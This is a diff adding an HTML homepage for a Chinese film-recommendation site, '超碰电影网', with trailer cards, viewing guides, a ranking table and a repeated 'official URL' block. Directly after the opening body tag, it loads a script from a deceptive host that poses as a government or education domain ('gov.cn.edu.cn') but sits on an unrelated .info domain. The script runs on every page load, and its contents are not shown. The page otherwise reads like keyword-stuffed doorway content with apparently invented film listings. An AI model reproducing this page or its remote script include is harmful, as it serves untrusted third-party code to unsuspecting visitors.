@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>超碰电影网｜影视内容编辑部：新片预告、口碑榜单、观前须知与每周片单</title>
+<meta name="description" content="超碰电影网（访问地址 https://chaopengdianyingwang-zh.github.io）是聚焦院线与流媒体影视内容的独立编辑站，每日更新新片定档预告、口碑风向解读、剧集连载追踪与观前须知，用通俗的编辑语言帮观众在开播前做对选择。">
+<meta name="keywords" content="超碰电影网,影视内容,新片预告,口碑榜单,观前须知,每周片单,院线电影,热播剧集,动漫推荐,影视资讯">
+<meta name="author" content="超碰电影网编辑部">
+<meta name="robots" content="index, follow, max-snippet:-1, max-video-preview:-1">
+<meta name="revisit-after" content="1 days">
+<meta name="theme-color" content="#1a0a14">
+<link rel="canonical" href="https://chaopengdianyingwang-zh.github.io/">
+<style>
+:root{
+  --bg:#12080d; --bg2:#1a0d14; --panel:#21101a; --panel2:#2a1320;
+  --line:#3a2230; --line2:#2c1a24;
+  --txt:#f2e9ee; --txt2:#c9bcc4; --txt3:#8f7e89;
+  --ac:#ff2e63; --ac2:#ff6b96; --gold:#e8b04b; --cyan:#4fd1c5;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.7;font-size:16px;overflow-x:hidden;
+}
+body::before{content:"";position:fixed;inset:0;z-index:-2;background:radial-gradient(1200px 700px at 12% 8%,rgba(255,46,99,.10),transparent 60%),radial-gradient(900px 600px at 88% 92%,rgba(79,209,197,.07),transparent 60%)}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1280px;margin:0 auto;padding:0 24px}
+.mono{font-family:ui-monospace,SFMono-Regular,"Cascadia Mono","WenQuanYi Micro Hei",monospace}
+.btn{display:inline-flex;align-items:center;gap:9px;padding:14px 30px;border:1px solid var(--ac);background:var(--ac);color:#fff;font-size:14.5px;font-weight:700;cursor:pointer;border-radius:0;letter-spacing:.04em;transition:.25s}
+.btn:hover{background:transparent;color:var(--ac)}
+.btn.line{background:transparent;color:var(--txt)}
+.btn.line:hover{background:var(--ac);color:#fff;border-color:var(--ac)}
+.kicker{font-family:ui-monospace,monospace;font-size:11.5px;letter-spacing:.28em;color:var(--gold);text-transform:uppercase}
+.line-l{width:48px;height:2px;background:var(--ac);margin:16px 0 26px}
+.tag{display:inline-block;padding:3px 10px;border:1px solid var(--line);font-size:11.5px;letter-spacing:.1em;color:var(--txt2);border-radius:2px}
+.tag.hot{border-color:var(--ac);color:var(--ac2)}
+.tag.new{border-color:var(--cyan);color:var(--cyan)}
+
+/* TOP */
+.top{background:#0c0509;border-bottom:1px solid var(--line2);font-size:12.5px;color:var(--txt3)}
+.top .wrap{display:flex;justify-content:space-between;height:38px;align-items:center;gap:16px;flex-wrap:wrap}
+.top a:hover{color:var(--ac2)}
+
+/* HEADER */
+header{padding:26px 0 22px;border-bottom:1px solid var(--line2);position:relative}
+.hd{display:flex;justify-content:space-between;align-items:flex-end;gap:30px;flex-wrap:wrap}
+.logo{display:flex;align-items:center;gap:16px}
+.logo .mk{width:52px;height:52px;border:2px solid var(--ac);display:grid;place-items:center;font-weight:900;font-size:19px;color:var(--ac);font-family:ui-monospace,monospace;flex:0 0 auto}
+.logo h1{font-size:clamp(26px,4.4vw,42px);font-weight:900;letter-spacing:.01em;line-height:1.1}
+.logo h1 i{font-style:normal;color:var(--ac)}
+.logo small{display:block;font-size:12px;color:var(--txt3);letter-spacing:.18em;margin-top:6px;text-transform:uppercase;font-family:ui-monospace,monospace}
+.live{text-align:right;font-size:12.5px;color:var(--txt3)}
+.live b{display:block;color:var(--txt);font-size:15px;font-weight:700}
+.live .blink{display:inline-block;width:7px;height:7px;background:var(--cyan);border-radius:50%;margin-right:6px;animation:bl 1.6s infinite}
+@keyframes bl{0%,100%{opacity:1}50%{opacity:.25}}
+
+/* NAV */
+nav{position:sticky;top:0;z-index:60;background:rgba(18,8,13,.94);backdrop-filter:blur(10px);border-bottom:1px solid var(--line2)}
+nav .wrap{display:flex;align-items:center;gap:2px;height:58px;overflow-x:auto}
+nav a{padding:10px 16px;font-size:14px;font-weight:600;color:var(--txt2);white-space:nowrap;position:relative;transition:.2s}
+nav a:hover{color:var(--ac2)}
+nav a.on{color:var(--ac)}
+nav a.on::after{content:"";position:absolute;left:16px;right:16px;bottom:-19px;height:2px;background:var(--ac)}
+nav::-webkit-scrollbar{height:0}
+
+/* HERO */
+.hero{padding:66px 0 46px;position:relative}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:52px;align-items:center}
+.hero h2{font-size:clamp(30px,5.4vw,58px);font-weight:900;line-height:1.12;letter-spacing:-.01em}
+.hero h2 em{font-style:normal;color:var(--ac)}
+.hero p.lede{margin-top:22px;font-size:17px;color:var(--txt2);max-width:560px}
+.hero .acts{margin-top:30px;display:flex;gap:14px;flex-wrap:wrap}
+.metrics{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--line2);border:1px solid var(--line2)}
+.metrics div{background:var(--bg2);padding:22px 20px}
+.metrics b{display:block;font-size:30px;font-weight:900;color:var(--ac);font-family:ui-monospace,monospace;line-height:1}
+.metrics span{display:block;font-size:12.5px;color:var(--txt3);margin-top:8px;letter-spacing:.06em}
+
+/* SECTION */
+section{padding:66px 0}
+.sec-t{display:flex;justify-content:space-between;align-items:flex-end;gap:24px;flex-wrap:wrap;margin-bottom:38px}
+.sec-t h3{font-size:clamp(22px,3.2vw,34px);font-weight:900;letter-spacing:.01em}
+.sec-t .r{font-size:13px;color:var(--txt3);text-align:right}
+
+/* MARQUEE TAPE */
+.tape{background:var(--ac);color:#12080d;padding:13px 0;overflow:hidden;border-top:1px solid var(--ac2);border-bottom:1px solid var(--ac2)}
+.tape .track{display:flex;gap:48px;white-space:nowrap;animation:mr 38s linear infinite;font-weight:800;font-size:14px;letter-spacing:.06em}
+.tape span{display:flex;align-items:center;gap:48px}
+.tape span::after{content:"◆";font-size:9px;opacity:.7}
+@keyframes mr{to{transform:translateX(-50%)}}
+
+/* CARDS */
+.grid{display:grid;gap:24px}
+.g4{grid-template-columns:repeat(4,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+.card{background:var(--panel);border:1px solid var(--line2);transition:.3s;display:flex;flex-direction:column}
+.card:hover{border-color:var(--ac);transform:translateY(-4px)}
+.card .th{aspect-ratio:3/4;position:relative;overflow:hidden}
+.card .th .cv{position:absolute;inset:0;display:grid;place-items:center;text-align:center;padding:18px;font-weight:900;font-size:16px;line-height:1.4;background:linear-gradient(160deg,var(--c1),var(--c2))}
+.card .th .idx{position:absolute;top:10px;left:10px;font-family:ui-monospace,monospace;font-size:11px;background:rgba(0,0,0,.55);padding:3px 8px;letter-spacing:.1em}
+.card .th .rate{position:absolute;bottom:10px;right:10px;background:var(--ac);color:#fff;font-weight:800;font-size:12px;padding:4px 9px}
+.card .th .ep{position:absolute;top:10px;right:10px;background:var(--gold);color:#12080d;font-weight:800;font-size:11.5px;padding:3px 8px}
+.card .bd{padding:18px 18px 20px;flex:1;display:flex;flex-direction:column}
+.card h4{font-size:16.5px;font-weight:800;line-height:1.45;margin-bottom:9px}
+.card p{font-size:13.5px;color:var(--txt2);flex:1}
+.card .ft{margin-top:14px;padding-top:12px;border-top:1px solid var(--line2);font-size:12px;color:var(--txt3);display:flex;justify-content:space-between;gap:10px}
+
+/* SPLIT feature */
+.split{display:grid;grid-template-columns:1fr 1fr;gap:52px;align-items:start}
+.vs{display:flex;flex-direction:column;gap:0;border:1px solid var(--line2)}
+.vs .it{display:grid;grid-template-columns:66px 1fr;gap:18px;padding:22px 20px;border-bottom:1px solid var(--line2);transition:.25s}
+.vs .it:last-child{border-bottom:0}
+.vs .it:hover{background:var(--panel)}
+.vs .it .n{font-family:ui-monospace,monospace;font-size:25px;font-weight:900;color:var(--ac);line-height:1.3}
+.vs .it .n em{display:block;font-style:normal;font-size:10.5px;color:var(--txt3);letter-spacing:.14em;font-weight:400}
+.vs .it h5{font-size:16px;font-weight:800;margin-bottom:6px}
+.vs .it p{font-size:13.5px;color:var(--txt2)}
+.qa{border-left:3px solid var(--ac);padding:0 0 0 26px}
+.qa .q{margin-bottom:26px}
+.qa .q:last-child{margin-bottom:0}
+.qa .q h6{font-size:15.5px;font-weight:800;margin-bottom:8px;display:flex;gap:10px}
+.qa .q h6 i{color:var(--ac);font-style:normal;font-family:ui-monospace,monospace;flex:0 0 auto}
+.qa .q p{font-size:14px;color:var(--txt2)}
+
+/* TIMELINE */
+.tl{border:1px solid var(--line2);background:var(--bg2)}
+.tl-head{display:grid;grid-template-columns:repeat(4,1fr);border-bottom:1px solid var(--line2);background:var(--panel2)}
+.tl-head div{padding:16px 20px;border-right:1px solid var(--line2);font-size:12px;letter-spacing:.1em;color:var(--gold);text-transform:uppercase;font-family:ui-monospace,monospace}
+.tl-head div:last-child{border-right:0}
+.tl-row{display:grid;grid-template-columns:repeat(4,1fr);border-bottom:1px solid var(--line2)}
+.tl-row:last-child{border-bottom:0}
+.tl-row div{padding:17px 20px;border-right:1px solid var(--line2);font-size:14px}
+.tl-row div:last-child{border-right:0}
+.tl-row .d{color:var(--txt3);font-family:ui-monospace,monospace;font-size:12.5px}
+.tl-row .t{font-weight:700}
+.tl-row .s{color:var(--ac2);font-weight:700}
+.tl-row:hover{background:var(--panel)}
+.tl-row:hover .t{color:var(--ac2)}
+
+/* DOMAIN block */
+.domain{background:linear-gradient(120deg,var(--panel2),var(--bg2));border:1px solid var(--line);padding:44px;position:relative;overflow:hidden}
+.domain::after{content:"URL";position:absolute;right:-10px;bottom:-30px;font-size:150px;font-weight:900;color:rgba(255,255,255,.025);font-family:ui-monospace,monospace;line-height:1}
+.domain-grid{display:grid;grid-template-columns:1fr 1fr;gap:44px;align-items:center;position:relative;z-index:1}
+.domain .code{background:#0a0408;border:1px solid var(--line);padding:24px 26px;font-family:ui-monospace,monospace;font-size:clamp(15px,2.6vw,21px);color:var(--ac2);word-break:break-all;letter-spacing:.02em;position:relative}
+.domain .code::before{content:"$";position:absolute;left:10px;top:24px;color:var(--gold)}
+.domain .code span{padding-left:16px;display:block}
+.copy{margin-top:18px;background:var(--gold);border-color:var(--gold);color:#1a0a14}
+.copy:hover{background:transparent;color:var(--gold)}
+.dlist{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--line2);margin-top:26px;border:1px solid var(--line2)}
+.dlist div{background:var(--bg2);padding:16px 18px}
+.dlist b{display:block;font-size:15px;font-weight:800;color:var(--txt)}
+.dlist span{font-size:12px;color:var(--txt3)}
+
+/* FOOTER */
+footer{background:#0a0408;border-top:3px solid var(--ac);padding:54px 0 26px;font-size:13.5px;color:var(--txt3)}
+.fg{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:40px;margin-bottom:40px}
+.fg h5{color:var(--txt);font-size:14px;margin-bottom:16px;letter-spacing:.06em}
+.fg ul{display:flex;flex-direction:column;gap:10px}
+.fg a:hover{color:var(--ac2)}
+.brand-f h4{font-size:24px;font-weight:900;color:var(--txt);letter-spacing:.01em}
+.brand-f h4 i{font-style:normal;color:var(--ac)}
+.brand-f p{margin-top:12px;max-width:360px;line-height:1.75}
+.brand-f .url{margin-top:18px;font-family:ui-monospace,monospace;font-size:13px;color:var(--ac2);border:1px solid var(--line);padding:9px 14px;display:inline-block}
+.col{display:flex;justify-content:space-between;gap:18px;flex-wrap:wrap;padding-top:24px;border-top:1px solid var(--line2);font-size:12.5px}
+.col .hl{color:var(--gold);font-weight:700}
+
+/* REVEAL */
+.rv{opacity:0;transform:translateY(28px);transition:.8s cubic-bezier(.2,.65,.3,1)}
+.rv.in{opacity:1;transform:none}
+@media(max-width:960px){
+  .hero-grid,.split,.domain-grid{grid-template-columns:1fr;gap:34px}
+  .g4{grid-template-columns:repeat(2,1fr)}
+  .g3{grid-template-columns:1fr}
+  .fg{grid-template-columns:1fr 1fr;gap:32px}
+  .metrics,.dlist{grid-template-columns:1fr 1fr}
+  .tl-head,.tl-row{grid-template-columns:1fr 1fr}
+  .tl-head div:nth-child(2),.tl-row div:nth-child(2){border-right:0}
+  section{padding:50px 0}
+  .hero{padding:46px 0 34px}
+  .qa{padding-left:20px}
+}
+@media(max-width:560px){
+  .wrap{padding:0 18px}
+  .g4{grid-template-columns:1fr}
+  .logo h1{font-size:29px}
+  .domain{padding:28px 22px}
+  .fg{grid-template-columns:1fr}
+  .live{text-align:left}
+  .hd{flex-direction:column;align-items:flex-start}
+  .tl-head,.tl-row{grid-template-columns:1fr}
+  .tl-head div,.tl-row div{border-right:0;border-bottom:1px solid var(--line2)}
+  .tl-row div:last-child,.tl-head div:last-child{border-bottom:0}
+  .metrics,.dlist{grid-template-columns:1fr}
+  .btn{padding:13px 22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 顶部信息条 -->
+<div class="top">
+  <div class="wrap">
+    <span>影视内容编辑站 · 独立运营 · 每日更新</span>
+    <span><a href="#">内容投稿</a> &nbsp;·&nbsp; <a href="#">合作联系</a> &nbsp;·&nbsp; <a href="#">免责声明</a></span>
+  </div>
+</div>
+
+<!-- 头部 -->
+<header>
+  <div class="wrap">
+    <div class="hd">
+      <div class="logo">
+        <div class="mk">CP</div>
+        <div>
+          <h1>超碰<i>电影网</i></h1>
+          <small>Film Desk / Editorial</small>
+        </div>
+      </div>
+      <div class="live">
+        <span><i class="blink"></i>编辑部在线 · 内容实时更新</span>
+        <b>访问地址 chaopengdianyingwang-zh.github.io</b>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- 主导航 -->
+<nav><div class="wrap">
+  <a href="#top" class="on">首页</a>
+  <a href="#new">新片预告</a>
+  <a href="#guide">选片指南</a>
+  <a href="#list">每周片单</a>
+  <a href="#rank">口碑排行</a>
+  <a href="#qa">常见问题</a>
+  <a href="#site">访问网址</a>
+</div></nav>
+
+<!-- Hero -->
+<section class="hero" id="top">
+  <div class="wrap">
+    <div class="hero-grid">
+      <div>
+        <span class="kicker">Editorial · 开卷语</span>
+        <div class="line-l"></div>
+        <h2>超碰电影网，<br>把<em>开播前</em>那一步功课<br>替你做掉。</h2>
+        <p class="lede">不搬运资源，不刷水榜。超碰电影网只做一件事：把院线与流媒体上的新片、新剧、新番，用编辑的语言讲清楚它讲什么、值不值得看、适合谁看——在你点下播放键之前。</p>
+        <div class="acts">
+          <a class="btn" href="#new">查看本周新片预告</a>
+          <a class="btn line" href="#guide">阅读选片指南</a>
+        </div>
+      </div>
+      <div class="metrics">
+        <div><b>6</b><span>常设内容栏目</span></div>
+        <div><b>每日</b><span>更新频次</span></div>
+        <div><b>12+</b><span>题材分类标签</span></div>
+        <div><b>0</b><span>影视资源存储</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 滚动资讯带 -->
+<div class="tape"><div class="track">
+  <span>◆ 院线新片定档速递 ◆ 热播剧集连载追踪 ◆ 口碑风向解读 ◆ 观前须知与避坑提示 ◆ 每周精选片单 ◆ 高分老片补档 ◆ 超碰电影网 · chaopengdianyingwang-zh.github.io</span>
+  <span>◆ 院线新片定档速递 ◆ 热播剧集连载追踪 ◆ 口碑风向解读 ◆ 观前须知与避坑提示 ◆ 每周精选片单 ◆ 高分老片补档 ◆ 超碰电影网 · chaopengdianyingwang-zh.github.io</span>
+</div></div>
+
+<!-- 新片预告 -->
+<section id="new">
+  <div class="wrap">
+    <div class="sec-t">
+      <div><span class="kicker">01 / New Releases</span><h3>新片预告 · 定档与看点</h3><div class="line-l"></div></div>
+      <div class="r">编辑部精选 · 更新于 2026.10.06<br>访问入口 chaopengdianyingwang-zh.github.io</div>
+    </div>
+    <div class="grid g4">
+      <article class="card"><div class="th"><div class="cv" style="--c1:#3a0d20;--c2:#1a0510">追光者</div><span class="idx">NO.01</span><span class="rate">8.7</span></div><div class="bd"><span class="tag hot">院线热映</span><h4 style="margin-top:11px">追光者：一场没有反派的救援</h4><p>不靠反转制造刺激，靠真实感支撑全程。救援细节经得起推敲，是近期完成度最高的灾难题材作品。</p><div class="ft"><span>灾难 · 动作</span><span>132 分钟</span></div></div></article>
+      <article class="card"><div class="th"><div class="cv" style="--c1:#0d2a3a;--c2:#051a26">沉默的电话亭</div><span class="idx">NO.02</span><span class="rate">8.4</span></div><div class="bd"><span class="tag new">点映中</span><h4 style="margin-top:11px">沉默的电话亭</h4><p>一部关于错过与道歉的悬疑片，台词密度高，中段那场七分钟长镜头是全片高光。</p><div class="ft"><span>悬疑 · 剧情</span><span>108 分钟</span></div></div></article>
+      <article class="card"><div class="th"><div class="cv" style="--c1:#2a2a0d;--c2:#161605">稻香路的夏天</div><span class="idx">NO.03</span><span class="rate">8.9</span></div><div class="bd"><span class="tag hot">口碑上升</span><h4 style="margin-top:11px">稻香路的夏天</h4><p>南方小镇的青春群像，笑点自然不刻意，结尾那场告别戏值得二刷。</p><div class="ft"><span>青春 · 治愈</span><span>115 分钟</span></div></div></article>
+      <article class="card"><div class="th"><div class="cv" style="--c1:#1d0d3a;--c2:#0e0520">第七种假设</div><span class="idx">NO.04</span><span class="rate">7.9</span></div><div class="bd"><span class="tag">即将上映</span><h4 style="margin-top:11px">第七种假设</h4><p>多线叙事的烧脑推理，前半小时节奏偏慢，但一旦进入状态便停不下来。</p><div class="ft"><span>推理 · 犯罪</span><span>126 分钟</span></div></div></article>
+      <article class="card"><div class="th"><div class="cv" style="--c1:#3a250d;--c2:#1f1305">边境夜车</div><span class="idx">NO.05</span><span class="rate">8.1</span></div><div class="bd"><span class="tag hot">连载更新</span><h4 style="margin-top:11px">边境夜车</h4><p>刑侦群像剧，人物关系铺得扎实，每集结尾都留一个足够硬的钩子。</p><div class="ft"><span>刑侦 · 剧集</span><span>12 集</span></div></div></article>
+      <article class="card"><div class="th"><div class="cv" style="--c1:#0d3a2e;--c2:#05241c">潮汐事务所</div><span class="idx">NO.06</span><span class="rate">8.5</span></div><div class="bd"><span class="tag new">全集上线</span><h4 style="margin-top:11px">潮汐事务所</h4><p>都市奇幻单元剧，每集一个独立故事，最适合一口气刷完。</p><div class="ft"><span>奇幻 · 单元剧</span><span>10 集</span></div></div></article>
+      <article class="card"><div class="th"><div class="cv" style="--c1:#3a0d30;--c2:#1f051a">她的第三种人生</div><span class="idx">NO.07</span><span class="rate">8.6</span></div><div class="bd"><span class="tag hot">点映中</span><h4 style="margin-top:11px">她的第三种人生</h4><p>中年女性题材，不贩卖焦虑不强行励志，表演是最大看点。</p><div class="ft"><span>剧情 · 现实</span><span>121 分钟</span></div></div></article>
+      <article class="card"><div class="th"><div class="cv" style="--c1:#252525;--c2:#0d0d0d">纪录片：山海之间</div><span class="idx">NO.08</span><span class="rate">9.1</span></div><div class="bd"><span class="tag">资料馆</span><h4 style="margin-top:11px">山海之间</h4><p>四季跟拍一个海岛渔村，没有旁白解说，画面本身就足够有力。</p><div class="ft"><span>纪录片</span><span>96 分钟</span></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 选片指南 -->
+<section id="guide" style="background:#0e060b">
+  <div class="wrap">
+    <div class="sec-t">
+      <div><span class="kicker">02 / Watching Guide</span><h3>选片指南 · 按场景找片</h3><div class="line-l"></div></div>
+      <div class="r">依据真实观影反馈整理<br>共 8 类常见观影场景</div>
+    </div>
+    <div class="split">
+      <div class="vs">
+        <div class="it"><div class="n">01<em>SCENE</em></div><div><h5>一个人想安静看</h5><p>优先选片长 110 分钟以内的剧情片或纪录片，避开群像和大场面，深夜观看体验更佳。</p></div></div>
+        <div class="it"><div class="n">02<em>SCENE</em></div><div><h5>两个人约会看</h5><p>喜剧与轻悬疑容错率高，避免过于沉重或题材敏感的作品，节奏明快更重要。</p></div></div>
+        <div class="it"><div class="n">03<em>SCENE</em></div><div><h5>全家一起看</h5><p>留意适龄提示，动画与冒险类优先；部分成人向喜剧含大量台词梗，老人可能跟不上。</p></div></div>
+        <div class="it"><div class="n">04<em>SCENE</em></div><div><h5>想看完聊点什么</h5><p>社会议题与伦理困境类作品讨论度高，建议搭配本刊影评一起看，观点更立体。</p></div></div>
+        <div class="it"><div class="n">05<em>SCENE</em></div><div><h5>时间只有一小时</h5><p>选择单集 40 分钟以内的剧集或短片，避免开始即入坑、停不下来的长线作品。</p></div></div>
+        <div class="it"><div class="n">06<em>SCENE</em></div><div><h5>想看场面与视听</h5><p>关注视效大片的窗口期与版本信息，错过最佳档期体验会打折扣。</p></div></div>
+        <div class="it"><div class="n">07<em>SCENE</em></div><div><h5>想补经典老片</h5><p>资料馆每月推荐一部修复版，附背景资料与观看要点，适合系统性补档。</p></div></div>
+        <div class="it"><div class="n">08<em>SCENE</em></div><div><h5>只想轻松不费脑</h5><p>公路、美食、职场轻喜剧三类最稳，本刊会单独标注"无门槛"标签。</p></div></div>
+      </div>
+      <div>
+        <span class="kicker">Editor's Note</span>
+        <div class="line-l"></div>
+        <h3 style="font-size:clamp(20px,2.8vw,28px);font-weight:900;line-height:1.5">"好片不一定适合你，<br>适合的才是最好的。"</h3>
+        <p style="margin-top:18px;color:var(--txt2);font-size:15px">超碰电影网的选片逻辑不是给作品排高低，而是帮观众把"我想看什么"说清楚。同一个评分，有人觉得刚好，有人觉得太慢——差别往往不在片，而在场景。</p>
+        <div class="qa" style="margin-top:30px">
+          <div class="q"><h6><i>Q1</i>看预告片会被剧透吗？</h6><p>会，尤其"剧情版预告"常泄露关键转折。本刊在每部新片的预告解读里都会标注剧透程度，方便你决定要不要先看。</p></div>
+          <div class="q"><h6><i>Q2</i>评分高就一定好看？</h6><p>不一定。评分反映的是平均水平，而个人偏好才是决定性因素。本刊的观前须知会同时给出"大概率喜欢"和"可能不适"两组信号。</p></div>
+          <div class="q"><h6><i>Q3</i>什么时候看最适合？</h6><p>院线片建议避开首周场，等口碑稳定后再决定；流媒体剧集则可先刷前两集，判断节奏是否合拍。</p></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 每周片单 -->
+<section id="list">
+  <div class="wrap">
+    <div class="sec-t">
+      <div><span class="kicker">03 / Weekly List</span><h3>每周片单 · 更新时间表</h3><div class="line-l"></div></div>
+      <div class="r">周一至周日 · 按主题编排<br>历史片单可查资料馆</div>
+    </div>
+    <div class="grid g3">
+      <article class="card"><div class="th" style="aspect-ratio:16/9"><div class="cv" style="--c1:#3a1025;--c2:#1c0812">周一 · 开周新片</div><span class="ep">EP 01</span></div><div class="bd"><h4>新片速览：本周 5 部新作看点拆解</h4><p>每部 3 分钟讲清核心看点、适合人群与观前提示，周一开始更新。</p><div class="ft"><span>每周一 10:00</span><span>编辑部</span></div></div></article>
+      <article class="card"><div class="th" style="aspect-ratio:16/9"><div class="cv" style="--c1:#102a3a;--c2:#081c26">周三 · 口碑复盘</div><span class="ep">EP 02</span></div><div class="bd"><h4>口碑复盘：哪些值得二刷</h4><p>从视听、文本、表演三个维度给二刷理由，避开单纯打分式的评价。</p><div class="ft"><span>每周三 20:00</span><span>影评组</span></div></div></article>
+      <article class="card"><div class="th" style="aspect-ratio:16/9"><div class="cv" style="--c1:#2a2a10;--c2:#161605">周六 · 周末片单</div><span class="ep">EP 03</span></div><div class="bd"><h4>周末片单：3 部作品三种心情</h4><p>按"想放松 / 想动脑 / 想被治愈"三类各选一部，适合一家人各取所需。</p><div class="ft"><span>每周六 09:00</span><span>选片组</span></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 口碑排行 -->
+<section id="rank" style="background:#0e060b">
+  <div class="wrap">
+    <div class="sec-t">
+      <div><span class="kicker">04 / Ranking</span><h3>口碑排行 · 综合评分榜</h3><div class="line-l"></div></div>
+      <div class="r">评分结合口碑与讨论度<br>每周日 22:00 更新</div>
+    </div>
+    <div class="tl">
+      <div class="tl-head"><div>排名</div><div>片名 / 作品</div><div>类型</div><div>状态</div></div>
+      <div class="tl-row"><div class="d">#01</div><div class="t">稻香路的夏天</div><div>青春 · 治愈</div><div class="s">点映中</div></div>
+      <div class="tl-row"><div class="d">#02</div><div class="t">追光者</div><div>灾难 · 动作</div><div class="s">院线热映</div></div>
+      <div class="tl-row"><div class="d">#03</div><div class="t">山海之间（纪录片）</div><div>纪录片</div><div class="s">资料馆</div></div>
+      <div class="tl-row"><div class="d">#04</div><div class="t">她的第三种人生</div><div>剧情 · 现实</div><div class="s">点映中</div></div>
+      <div class="tl-row"><div class="d">#05</div><div class="t">潮汐事务所</div><div>奇幻 · 单元剧</div><div class="s">全集上线</div></div>
+      <div class="tl-row"><div class="d">#06</div><div class="t">沉默的电话亭</div><div>悬疑 · 剧情</div><div class="s">点映中</div></div>
+      <div class="tl-row"><div class="d">#07</div><div class="t">边境夜车</div><div>刑侦 · 剧集</div><div class="s">连载更新</div></div>
+      <div class="tl-row"><div class="d">#08</div><div class="t">第七种假设</div><div>推理 · 犯罪</div><div class="s">即将上映</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 访问网址 -->
+<section id="site">
+  <div class="wrap">
+    <div class="sec-t">
+      <div><span class="kicker">05 / Official URL</span><h3>访问网址 · 官方入口</h3><div class="line-l"></div></div>
+      <div class="r">请认准唯一官方地址<br>谨防仿冒与相似域名</div>
+    </div>
+    <div class="domain">
+      <div class="domain-grid">
+        <div>
+          <span class="kicker">Official Access</span>
+          <div class="line-l"></div>
+          <p style="color:var(--txt2);font-size:16px;max-width:520px">超碰电影网的唯一官方访问地址为下方链接，网站名称与域名一一对应，请在浏览器地址栏手动核对后收藏。本站不存储、不分发任何影视资源，所有内容仅用于观影决策参考。</p>
+          <div class="dlist">
+            <div><b>网站名称</b><span>超碰电影网</span></div>
+            <div><b>官方网址</b><span>chaopengdianyingwang-zh.github.io</span></div>
+            <div><b>完整地址</b><span>https://chaopengdianyingwang-zh.github.io</span></div>
+            <div><b>更新频率</b><span>每日更新</span></div>
+          </div>
+        </div>
+        <div>
+          <div class="code"><span id="curl">https://chaopengdianyingwang-zh.github.io</span></div>
+          <button class="btn copy" id="cp">复制官方网址</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="fg">
+      <div class="brand-f">
+        <h4>超碰<i>电影网</i></h4>
+        <p>独立影视内容编辑站。只做观影前的功课：预告、榜单、指南与解读，帮你把选片成本降下来。</p>
+        <div class="url">https://chaopengdianyingwang-zh.github.io</div>
+      </div>
+      <div><h5>内容栏目</h5><ul>
+        <li><a href="#new">新片预告</a></li><li><a href="#guide">选片指南</a></li><li><a href="#list">每周片单</a></li><li><a href="#rank">口碑排行</a></li><li><a href="#site">访问网址</a></li>
+      </ul></div>
+      <div><h5>题材分类</h5><ul>
+        <li><a href="#">剧情片</a></li><li><a href="#">喜剧片</a></li><li><a href="#">悬疑犯罪</a></li><li><a href="#">动画动漫</a></li><li><a href="#">纪录片</a></li>
+      </ul></div>
+      <div><h5>关于本站</h5><ul>
+        <li><a href="#site">官方网址</a></li><li><a href="#">投稿入口</a></li><li><a href="#">合作联系</a></li><li><a href="#">免责声明</a></li><li><a href="#">返回顶部</a></li>
+      </ul></div>
+    </div>
+    <div class="col">
+      <span>© 2026 超碰电影网 · 网站名称：超碰电影网 · 官方网址：<span class="hl">https://chaopengdianyingwang-zh.github.io</span></span>
+      <span>Film Desk Editorial · All content for reference only.</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var cp=document.getElementById('cp'),u=document.getElementById('curl').innerText;
+  cp.addEventListener('click',function(){
+    var ok=function(){cp.innerText='已复制官方网址 ✓';setTimeout(function(){cp.innerText='复制官方网址';},1800);};
+    if(navigator.clipboard&&navigator.clipboard.writeText){
+      navigator.clipboard.writeText(u).then(ok,function(){fb();});
+    }else fb();
+    function fb(){var t=document.createElement('textarea');t.value=u;t.style.cssText='position:fixed;opacity:0;top:0';document.body.appendChild(t);t.select();try{document.execCommand('copy');ok();}catch(e){}document.body.removeChild(t);}
+  });
+
+  var links=document.querySelectorAll('nav a');
+  var map={};
+  links.forEach(function(a){var id=a.getAttribute('href');if(id&&id.charAt(0)==='#'){map[id]=a;}});
+  function onScroll(){
+    var cur='#top',y=window.scrollY+120;
+    Object.keys(map).forEach(function(k){
+      var el=document.querySelector(k);
+      if(el&&el.offsetTop<=y)cur=k;
+    });
+    links.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')===cur);});
+  }
+  window.addEventListener('scroll',onScroll,{passive:true});onScroll();
+
+  if('IntersectionObserver' in window){
+    var els=document.querySelectorAll('.card,.it,.tl-row,.domain,.qa .q,.metrics div,.dlist div');
+    els.forEach(function(el){el.classList.add('rv');});
+    var io=new IntersectionObserver(function(es){
+      es.forEach(function(e){if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}});
+    },{threshold:.1});
+    els.forEach(function(el){io.observe(el);});
+  }
+})();
+</script>
+</body>
+</html>
